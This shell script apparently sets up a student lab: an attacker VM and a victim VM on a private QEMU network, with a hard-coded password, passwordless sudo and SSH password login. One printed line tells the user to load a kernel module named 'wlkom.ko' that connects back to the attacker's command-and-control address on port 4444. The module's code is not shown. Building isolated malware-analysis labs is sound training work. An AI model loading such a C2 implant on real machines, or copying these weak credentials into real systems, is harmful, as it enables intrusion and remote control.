#!/bin/sh
# Usage: ./vm.sh attacker   (start first — listens on socket)
#        ./vm.sh victim     (start second — connects to attacker)

set -e

VM="${1:-}"
VM_DIR="./vms"
VMSHARE="./vmshare"
DEBIAN_URL="https://cloud.debian.org/images/cloud/bookworm/latest/debian-12-genericcloud-amd64.qcow2"
ARCH_URL="https://geo.mirror.pkgbuild.com/images/latest/Arch-Linux-x86_64-cloudimg.qcow2"
PASSWORD="epita"
C2_PORT="4444"
VICTIM_IP="192.168.100.20"
ATTACKER_IP="192.168.100.10"
VICTIM_MAC="52:54:00:aa:bb:cc"
ATTACKER_MAC="52:54:00:dd:ee:ff"
VICTIM_ETH_MAC="52:54:00:11:22:01"
ATTACKER_ETH_MAC="52:54:00:11:22:02"

for cmd in qemu-system-x86_64 qemu-img mkisofs wget openssl; do
    command -v "$cmd" >/dev/null 2>&1 || {
        echo "Missing: $cmd" >&2
        echo "sudo pacman -S qemu-full cdrtools wget openssl" >&2
        exit 1
    }
done

mkdir -p "$VM_DIR" "$VMSHARE"

make_seed() {
    local name="$1" hostname="$2" mac="$3" ip="$4" extra="$5" eth_mac="$6"
    local seed_dir hashed_pw
    seed_dir=$(mktemp -d)
    hashed_pw=$(printf '%s' "$PASSWORD" | openssl passwd -6 -stdin)

    printf 'instance-id: %s\nlocal-hostname: %s\n' "$name" "$hostname" \
        > "$seed_dir/meta-data"

    cat > "$seed_dir/user-data" << EOF
#cloud-config
users:
  - name: epita
    sudo: ALL=(ALL) NOPASSWD:ALL
    shell: /bin/bash
    lock_passwd: false
    passwd: $hashed_pw
ssh_pwauth: true
keyboard:
  layout: fr
$extra
EOF

    cat > "$seed_dir/network-config" << EOF
version: 2
ethernets:
  eth0:
    match:
      macaddress: "$eth_mac"
    dhcp4: true
  vmnet:
    match:
      macaddress: "$mac"
    set-name: vmnet
    addresses: ["$ip/24"]
EOF

    mkisofs -output "$VM_DIR/${name}-seed.iso" -volid cidata -joliet -rock \
        "$seed_dir/" 2>/dev/null
    rm -rf "$seed_dir"
}

case "$VM" in
victim)
    # The Debian cloud image uses linux-image-cloud-amd64 which is compiled without
    # 9pnet_virtio/9p modules needed for virtfs (vmshare). We install linux-image-amd64
    # (standard kernel) and remove the cloud kernel at first boot. nofail on the 9p
    # mount prevents emergency mode if the mount fails before the kernel switch.
    # Note: the VM reboots automatically after first boot (power_state: reboot) to
    # switch to the standard kernel. Expect two boots on first creation.
    if [ ! -f "$VM_DIR/debian-12-base.qcow2" ]; then
        echo "Downloading Debian 12 cloud image (~400MB)..."
        wget -q --show-progress -O "$VM_DIR/debian-12-base.qcow2" "$DEBIAN_URL"
    fi
    if [ ! -f "$VM_DIR/victim.qcow2" ]; then
        cp "$VM_DIR/debian-12-base.qcow2" "$VM_DIR/victim.qcow2"
        qemu-img resize "$VM_DIR/victim.qcow2" 20G
        make_seed "victim" "epita-victim" "$VICTIM_MAC" "$VICTIM_IP" \
'packages:
  - build-essential
  - linux-headers-amd64
  - linux-image-amd64
  - git
write_files:
  - path: /etc/vconsole.conf
    content: |
      KEYMAP=fr
  - path: /etc/default/keyboard
    content: |
      XKBMODEL="pc105"
      XKBLAYOUT="fr"
      XKBVARIANT=""
      XKBOPTIONS=""
      BACKSPACE="guess"
  - path: /etc/modules-load.d/9p.conf
    content: |
      9pnet_virtio
      9p
mounts:
  - [hostshare, /mnt/vmshare, 9p, "trans=virtio,version=9p2000.L,nofail", "0", "0"]
runcmd:
  - mkdir -p /mnt/vmshare
  - apt-get remove --purge -y linux-image-cloud-amd64 || true
  - update-grub || true
power_state:
  mode: reboot
  message: "Switching to standard kernel"
  timeout: 30' \
"$VICTIM_ETH_MAC"
    fi
    echo "Victim VM — SSH: ssh -p 10022 epita@localhost"
    echo "insmod: sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$C2_PORT"
    exec env GDK_BACKEND=wayland qemu-system-x86_64 \
        -enable-kvm -cpu host -smp 2 -m 2048 \
        -drive "file=$VM_DIR/victim.qcow2,if=virtio,format=qcow2" \
        -drive "file=$VM_DIR/victim-seed.iso,media=cdrom,readonly=on" \
        -netdev "user,id=user0,hostfwd=tcp::10022-:22" \
        -device "virtio-net-pci,mac=$VICTIM_ETH_MAC,netdev=user0" \
        -netdev "socket,id=vmnet,connect=localhost:1234" \
        -device "virtio-net-pci,mac=$VICTIM_MAC,netdev=vmnet" \
        -virtfs "local,path=$VMSHARE,mount_tag=hostshare,security_model=passthrough,id=hostshare" \
        -display gtk \
        -k fr
    ;;

attacker)
    if [ ! -f "$VM_DIR/arch-base.qcow2" ]; then
        echo "Downloading Arch Linux cloud image (~700MB)..."
        wget -q --show-progress -O "$VM_DIR/arch-base.qcow2" "$ARCH_URL"
    fi
    if [ ! -f "$VM_DIR/attacker.qcow2" ]; then
        cp "$VM_DIR/arch-base.qcow2" "$VM_DIR/attacker.qcow2"
        qemu-img resize "$VM_DIR/attacker.qcow2" 15G
        make_seed "attacker" "epita-attacker" "$ATTACKER_MAC" "$ATTACKER_IP" \
'mounts:
  - [hostshare, /mnt/vmshare, 9p, "trans=virtio,version=9p2000.L,nofail", "0", "0"]
runcmd:
  - mkdir -p /mnt/vmshare
  - pacman -Sy --noconfirm base-devel git
  - sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config
  - systemctl enable --now sshd' \
"$ATTACKER_ETH_MAC"
    fi
    echo "Attacker VM — SSH: ssh -p 10023 epita@localhost"
    echo "C2 will be reachable from victim at $ATTACKER_IP:$C2_PORT"
    exec qemu-system-x86_64 \
        -enable-kvm -cpu host -smp 2 -m 1024 \
        -drive "file=$VM_DIR/attacker.qcow2,if=virtio,format=qcow2" \
        -drive "file=$VM_DIR/attacker-seed.iso,media=cdrom,readonly=on" \
        -netdev "user,id=user0,hostfwd=tcp::10023-:22" \
        -device "virtio-net-pci,mac=$ATTACKER_ETH_MAC,netdev=user0" \
        -netdev "socket,id=vmnet,listen=:1234" \
        -device "virtio-net-pci,mac=$ATTACKER_MAC,netdev=vmnet" \
        -virtfs "local,path=$VMSHARE,mount_tag=hostshare,security_model=passthrough,id=hostshare" \
        -display gtk
    ;;

*)
    echo "Usage: $0 attacker | victim" >&2
    echo ""                                                    >&2
    echo "  Start attacker first: $0 attacker"                >&2
    echo "  Then start victim:    $0 victim"                  >&2
    exit 1
    ;;
esac
